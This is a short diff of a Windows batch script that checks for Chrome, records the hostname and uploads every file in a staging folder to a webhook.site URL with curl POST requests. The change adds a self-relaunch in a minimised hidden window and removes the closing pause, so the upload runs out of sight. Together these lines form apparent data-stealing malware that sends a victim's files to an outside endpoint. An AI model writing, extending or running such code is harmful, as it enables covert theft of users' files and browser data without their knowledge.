@@ -6,6 +6,8 @@ mkdir "%DEST%"
 for /f "tokens=*" %%a in ('hostname') do set DeviceName=%%a
 echo Randomfile is %DEST%
 
+if not "%1"=="hidden" start /min cmd /c "%~dpnx0" hidden & exit /b
+
 if exist "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" (
     echo Google Chrome is installed.
 )
@@ -32,4 +34,3 @@ for %%A in ("%DEST%\*") do (
     curl -X POST -F "file=@%%A" https://webhook.site/50e04090-829b-4ff1-bb01-7a9d2b82d17c
     curl -X POST -d "{'Device':'%DeviceName%', 'File':'%%A'}" https://webhook.site/50e04090-829b-4ff1-bb01-7a9d2b82d17c
 )
-pause
